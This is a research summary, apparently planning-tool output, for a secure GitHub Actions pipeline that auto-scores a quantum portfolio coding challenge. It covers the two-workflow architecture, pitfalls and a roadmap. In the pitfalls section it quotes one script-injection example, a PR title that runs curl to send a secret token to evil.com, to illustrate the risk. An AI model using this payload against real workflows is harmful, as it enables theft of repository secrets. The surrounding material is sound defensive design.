# Project Research Summary

**Project:** DDSC x DQC Quantum Portfolio Challenge - Auto-Scoring CI/CD
**Domain:** GitHub-based coding challenge platform with automated scoring
**Researched:** 2026-02-12
**Confidence:** HIGH

## Executive Summary

This project is a GitHub Actions-based auto-scoring system for a quantum optimization coding challenge hosted in a public repository. Research shows that the critical success factor is implementing a **security-first architecture** that safely executes untrusted code from forked PRs while providing immediate feedback through PR comments and maintaining a public README leaderboard. The recommended approach uses a two-workflow pattern with `workflow_run` triggers that separates untrusted code execution (scoring) from privileged operations (commenting, leaderboard updates).

The technical stack is straightforward: GitHub Actions (native), Python 3.11, and three carefully selected GitHub Actions for commenting (thollander/actions-comment-pull-request), auto-commits (stefanzweifel/git-auto-commit-action), and Python setup (actions/setup-python). All third-party actions must be pinned to commit SHAs, not mutable tags, to prevent supply chain attacks like the March 2025 tj-actions compromise that affected 23,000+ repositories.

The primary risk is the "pwn request" vulnerability — using `pull_request_target` with PR code checkout creates a critical security flaw that allows attackers to exfiltrate secrets, manipulate the leaderboard, or compromise the repository. Secondary risks include race conditions during concurrent leaderboard updates, script injection via untrusted PR metadata, and data quality issues with Stooq financial data. All of these risks are mitigated through the recommended architecture and validation procedures documented in the research.

## Key Findings

### Recommended Stack

GitHub Actions provides a mature, zero-cost solution for public repository CI/CD with a well-documented security model as of 2026. The recommended two-workflow pattern separates security contexts: Workflow 1 runs with `pull_request` trigger (read-only, no secrets, safe for untrusted code) to score submissions and upload results as artifacts; Workflow 2 runs with `workflow_run` trigger (write permissions, trusted base branch context) to download artifacts, post PR comments, and update the README leaderboard. This pattern is the official GitHub Security Lab recommendation for "building untrusted code and writing to a PR."

**Core technologies:**
- **GitHub Actions** (native): Zero external infrastructure, free for public repos, ephemeral GitHub-hosted runners prevent persistent compromise
- **Python 3.11** with pip caching: Matches project requirements.txt, stable runtime with fast dependency installation
- **thollander/actions-comment-pull-request v3.0.1**: Most popular PR comment action, supports `comment-tag` for updating existing comments instead of spam
- **stefanzweifel/git-auto-commit-action v7.1.0**: Most popular auto-commit action, handles git configuration automatically with GITHUB_TOKEN
- **actions/setup-python v6**: Official GitHub action, upgraded to node24 runtime in 2026

**Critical security requirement:** All third-party actions must be pinned to immutable commit SHAs, not mutable tags. After the March 2025 tj-actions/changed-files attack (23,000+ repos compromised via mutable tags), SHA pinning is non-negotiable. Enable Dependabot to automate SHA updates.

### Expected Features

Participants in technical coding challenges have clear expectations shaped by platforms like Codabench, GitHub Classroom, and competitive programming systems. The research identifies a crisp line between table-stakes features (must have for credibility) and differentiators (add value but not required for MVP).

**Must have (table stakes):**
- **PR-based submission validation** — automated checks on PR creation are standard GitHub workflow expectations
- **Immediate automated scoring** — participants expect instant feedback within seconds, not manual review delays
- **Public leaderboard** — core to competition psychology, participants want to see their ranking
- **Clear submission format documentation** — JSON schema with examples prevents frustration
- **Baseline solution to beat** — gives concrete target and verifies pipeline works (already exists: simulated annealing)
- **Validation error messages** — actionable errors like "Invalid JSON", "Wrong array length", "Missing key 'x'"
- **Time-based tiebreaker** — objective resolution when scores tie (PR creation timestamp)

**Should have (differentiators):**
- **Live leaderboard updates during event** — creates energy/excitement at in-person workshop via GitHub Actions auto-commit
- **Best submission per participant** — multiple PRs allowed, only best score counts
- **PR template with approach description** — participants document methodology (QAOA/VQE/Classical), creates knowledge sharing
- **Automated feasibility warnings** — flag infeasible solutions without disqualifying, helps participants debug

**Defer (v2+):**
- **Complex web dashboard** — over-engineering for time-boxed challenge, README leaderboard + GitHub UI is natural for technical audience
- **Energy trajectory visualization** — cool but non-essential, git history provides participant tracking
- **Solution diversity metrics** — interesting for post-event analysis, not critical for participant flow
- **Comparison to theoretical optimum** — research-grade feature, run after challenge to publish results

### Architecture Approach

The security boundary between untrusted fork code and privileged repository operations dictates the entire architecture. The two-workflow pattern provides isolation: untrusted code runs in one workflow with zero write permissions and zero secrets access, while privileged operations run in a separate workflow that never executes PR code. Communication happens exclusively through immutable GitHub Artifacts, which provides a safe data channel between security contexts.

**Major components:**
1. **Workflow 1 (score-submission.yml)** — pull_request trigger, runs in PR context, checks out PR code, executes evaluate.py on submission JSON, captures results, uploads artifact. Permissions: contents read only. No secrets. If malicious code attempts exploits, worst case is workflow fails with no side effects.
2. **Workflow 2 (report-results.yml)** — workflow_run trigger, runs in base repo context after Workflow 1 completes, downloads scoring artifact, posts PR comment with score using sticky comment (prevents spam), conditionally updates README leaderboard if submission is top 10. Permissions: contents write, pull-requests write. Never checks out or executes PR code.
3. **README Leaderboard Storage** — data/leaderboard.json stores full submission log (append-only), README.md contains top 10 table between comment markers (<!-- LEADERBOARD:START/END -->). Rebuilding from single source prevents merge conflicts during concurrent PRs.
4. **Artifact-based data flow** — score.json uploaded by Workflow 1, downloaded by Workflow 2. This is the only data passing between untrusted and trusted contexts, making sanitization surface area minimal.

**Critical security properties:**
- User-controlled data (submission JSON) only processed in read-only context
- Workflow 2 has write access but never executes PR code (runs from base branch definition)
- Attackers cannot redefine Workflow 2 logic from forks
- Ephemeral GitHub-hosted runners destroyed after each job (no persistent compromise)

### Critical Pitfalls

Research identified 13 pitfalls ranging from critical (security breaches) to minor (annoyance). The top 5 require mitigation before first PR:

1. **pull_request_target Privilege Escalation (CRITICAL)** — Using pull_request_target trigger with PR code checkout creates "pwn request" vulnerability. Attackers gain write access and secrets. Real-world impact: 2025 Shai Hulud v2 worm infected 20,000+ repos, GhostAction hijacked 327 accounts and stole 3,325 secrets. **Prevention:** Never use pull_request_target. Use two-workflow pattern with pull_request + workflow_run triggers.

2. **Script Injection via Untrusted Inputs (CRITICAL)** — Interpolating PR metadata (title, branch name) directly into shell commands allows command injection. Example attack: PR title `"; curl evil.com?secret=$SECRET_TOKEN #"` exfiltrates secrets. **Prevention:** Never interpolate `${{ github.event.* }}` into run commands. Use intermediate environment variables for all external inputs.

3. **Leaderboard Race Conditions (MODERATE)** — Concurrent PRs scoring simultaneously can interleave README updates, causing leaderboard entries to disappear. **Prevention:** Use concurrency groups to serialize leaderboard updates (`concurrency: { group: leaderboard-update, cancel-in-progress: false }`), store scores in append-only data/leaderboard.json, rebuild README from source of truth.

4. **Stooq Data Reliability Issues (CRITICAL)** — Stooq historical data contains deviations from reference data up to 11%, identical OHLC values in 10% of days, missing adjusted close prices for dividend assets. Using unvalidated data creates unreproducible results and invalidates challenge. **Prevention:** Validate Stooq data against Yahoo Finance for subset of tickers/dates, commit frozen instance.json with SHA256 hash before launch, document data provenance in README.

5. **Third-Party Action Supply Chain Attacks (MODERATE)** — Using actions referenced by mutable tags (actions/checkout@v4) allows attackers who compromise action repos to update tags to malicious code. March 2025 tj-actions attack updated 350+ tags, compromised 23,000 repos. **Prevention:** Pin all actions to immutable commit SHAs, enable Dependabot for automated updates, review action source code before first use.

## Implications for Roadmap

Based on research, the project naturally divides into 4 phases with clear dependencies. Security and validation must come first, then scoring automation, then participant-facing features, then polish.

### Phase 1: Foundation & Security
**Rationale:** Must establish security boundaries and validate data before accepting any PRs. The two-workflow pattern is foundational — cannot retrofit security after launch. Data validation prevents unreproducible results.

**Delivers:**
- Validated instance.json committed with SHA256 hash
- Two-workflow architecture (score.yml + report-results.yml)
- evaluate.py hardening with strict schema validation
- All actions pinned to SHAs with Dependabot enabled

**Addresses:**
- Pitfall 1 (pull_request_target exploit) — use correct triggers
- Pitfall 2 (script injection) — sanitize all inputs
- Pitfall 4 (Stooq data) — validate and freeze instance
- Pitfall 5 (supply chain) — pin to SHAs
- Pitfall 10 (action security) — SHA pinning

**Why this order:** Security vulnerabilities and data quality issues cannot be fixed reactively. Must be correct from day 1.

### Phase 2: Scoring Automation
**Rationale:** Core value proposition is immediate feedback. Participants need to see their scores to iterate. This is table-stakes feature that enables the challenge to function.

**Delivers:**
- Workflow 1 (score-submission.yml) runs on pull_request trigger
- Artifact upload with score JSON (energy, feasible, cardinality)
- Basic error handling for malformed submissions
- Testing with fork PRs to verify permissions

**Addresses:**
- Feature: PR-based submission validation (table stakes)
- Feature: Immediate automated scoring (table stakes)
- Feature: Validation error messages (table stakes)
- Pitfall 6 (missing permissions) — explicit permission grants
- Pitfall 8 (validation bypass) — strict schema checks

**Uses:**
- actions/setup-python@v6 (SHA pinned)
- Python 3.11 with pip cache
- GitHub-hosted ubuntu-latest runners

**Why this order:** Must have working scoring before adding comments/leaderboard. Scoring output is dependency for Phase 3.

### Phase 3: Participant Feedback
**Rationale:** Scoring is useless if participants can't see results. PR comments provide immediate visibility without requiring participants to read workflow logs. Sticky comments prevent spam when participants push updates.

**Delivers:**
- Workflow 2 (report-results.yml) with workflow_run trigger
- Artifact download from Workflow 1
- PR comment with formatted score using thollander action
- Helpful error comments when scoring fails

**Addresses:**
- Feature: Public feedback mechanism (table stakes, fulfilled via PR comments)
- Feature: Best submission per participant (sticky comment shows latest)
- Pitfall 12 (unclear errors) — helpful failure messages

**Uses:**
- thollander/actions-comment-pull-request@v3.0.1 (SHA pinned)
- Workflow artifacts for cross-workflow data passing

**Implements:** Component 2 from architecture (report-results.yml trusted context)

**Why this order:** Depends on Workflow 1 producing artifacts. Comments come before leaderboard because participants need feedback on failed submissions (which don't appear on leaderboard).

### Phase 4: Public Leaderboard
**Rationale:** Leaderboard is table stakes but can launch without it (PR comments suffice temporarily). More complex than scoring due to concurrency and git operations. Defer to minimize risk during workshop.

**Delivers:**
- data/leaderboard.json storage with append-only submission log
- Python script to rebuild README top 10 table from leaderboard.json
- Conditional README updates (only if submission is top 10)
- Concurrency controls to prevent race conditions
- Auto-commit via stefanzweifel action

**Addresses:**
- Feature: Public leaderboard (table stakes)
- Feature: Time-based tiebreaker (PR creation timestamp)
- Pitfall 3 (race conditions) — concurrency groups
- Pitfall 9 (timestamp manipulation) — document rules

**Uses:**
- stefanzweifel/git-auto-commit-action@v7.1.0 (SHA pinned)
- Python script for table generation
- git pull --rebase for conflict handling

**Implements:** Component 3 from architecture (README leaderboard storage)

**Why this order:** Most complex feature with highest risk. Can function without it initially. Requires testing concurrent PR scenarios.

### Phase Ordering Rationale

- **Security first:** Phases 1-2 establish trust boundary and validate all inputs before privileged operations
- **Feedback loop priority:** Phases 2-3 complete the participant-facing feedback cycle (score → see result)
- **Risk management:** Phase 4 deferred because leaderboard has concurrency complexity and can launch without it
- **Dependency chain:** Each phase depends on previous: security → scoring → comments → leaderboard
- **Pitfall avoidance:** Critical pitfalls (1, 2, 4, 5) all addressed in Phase 1 before any automation runs

### Research Flags

Phases with standard patterns (skip research-phase):
- **Phase 1:** Well-documented security patterns, GitHub official documentation (HIGH confidence)
- **Phase 2:** Standard GitHub Actions workflow patterns, evaluate.py already exists (HIGH confidence)
- **Phase 3:** Established PR comment patterns, popular actions with good docs (HIGH confidence)
- **Phase 4:** Standard git operations, artifact-based storage pattern (MEDIUM-HIGH confidence)

**No phases require /gsd:research-phase during planning.** All patterns are well-documented with HIGH confidence sources. Complexity comes from correct security implementation, not lack of knowledge.

## Confidence Assessment

| Area | Confidence | Notes |
|------|------------|-------|
| Stack | HIGH | Official GitHub documentation, verified actions with 1000+ stars, mature security model |
| Features | MEDIUM | Based on ecosystem survey (Codabench, GitHub Classroom, competitive programming) and participant expectation research. No direct user interviews. |
| Architecture | HIGH | GitHub Security Lab official recommendation (workflow_run pattern), multiple verified implementations, security research papers |
| Pitfalls | HIGH | Real-world incidents (2025 attacks), official GitHub security advisories, verified with multiple security sources |

**Overall confidence:** HIGH

The research is grounded in official documentation and recent security incidents. The two-workflow pattern is not experimental — it's the documented solution to a known problem class. Action selection based on GitHub Marketplace popularity (1000+ stars) and recent updates (2024-2026 releases). Feature expectations based on established platforms, though would benefit from user testing during implementation.

### Gaps to Address

**During Phase 1 (Validation):**
- Actual Stooq data quality for this specific date range (2023-01-01 to 2025-12-31) and tickers needs validation. Research shows general issues but not instance-specific verification.
- Cross-platform testing (Windows paths) should be conducted before committing instance.json generation scripts.

**During Phase 2 (Scoring):**
- Fork PR testing with actual GitHub accounts (not just branch PRs) to verify GITHUB_TOKEN permissions work correctly. Research documents expected behavior but implementation details matter.

**During Phase 4 (Leaderboard):**
- Concurrent PR testing under realistic load. Research documents concurrency groups but actual behavior with 5-10 simultaneous PRs should be validated.
- Git conflict resolution under high concurrency may need retry logic beyond documented patterns.

**Post-launch monitoring:**
- GitHub Actions minutes usage tracking (2000 minutes/month free tier may be sufficient but should be monitored)
- Leaderboard accuracy auditing (compare data/leaderboard.json against PR comments to detect race condition failures)

## Sources

### Primary (HIGH confidence)
- [GitHub Security Lab: Preventing pwn requests](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/) — Official security guidance
- [GitHub Docs: Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions) — Official security documentation
- [GitHub Docs: Events that trigger workflows](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows) — Trigger specifications
- [GitHub Docs: GITHUB_TOKEN permissions](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/controlling-permissions-for-github_token) — Permission model
- [actions/setup-python](https://github.com/actions/setup-python) — v6.0.0 released 2026, node24 upgrade
- [thollander/actions-comment-pull-request](https://github.com/thollander/actions-comment-pull-request) — v3.0.1 current stable
- [stefanzweifel/git-auto-commit-action](https://github.com/stefanzweifel/git-auto-commit-action) — v7.1.0 node24 runtime

### Secondary (MEDIUM confidence)
- [StepSecurity: Pinning GitHub Actions](https://www.stepsecurity.io/blog/pinning-github-actions-for-enhanced-security-a-complete-guide) — Supply chain security practices
- [GitGuardian: GitHub Actions Security Cheat Sheet](https://blog.gitguardian.com/github-actions-security-cheat-sheet/) — Security patterns
- [Orca Security: pull_request_nightmare exploits](https://orca.security/resources/blog/pull-request-nightmare-github-actions-rce/) — 2025 attack documentation
- [Portfolio backtesting dangers](https://bookdown.org/palomar/portfoliooptimizationbook/8.3-dangers-backtesting.html) — Academic reference
- [yfinance vs Stooq data quality comparison](https://medium.com/@Tobi_Lux/data-from-yfinance-some-observations-41e99d768069) — Data reliability research
- [Codabench Platform](https://www.codabench.org/) — Modern benchmark platform patterns
- [GitHub Classroom autograding](https://docs.github.com/en/education/manage-coursework-with-github-classroom/teach-with-github-classroom/use-autograding) — Educational auto-scoring patterns

### Tertiary (community sources, validated with multiple references)
- [RunsOn: Pull Request vs Pull Request Target](https://runs-on.com/github-actions/pull-request-vs-pull-request-target/) — Trigger comparison
- [OneUpTime: GitHub Actions Concurrency Control](https://oneuptime.com/blog/post/2026-01-25-github-actions-concurrency-control/view) — Concurrency patterns
- [Graphite: How to post a comment on a PR](https://graphite.com/guides/how-to-post-comment-on-pr-github-actions) — PR comment automation
- GitHub community discussions on race conditions and workflow patterns

---
*Research completed: 2026-02-12*
*Ready for roadmap: yes*
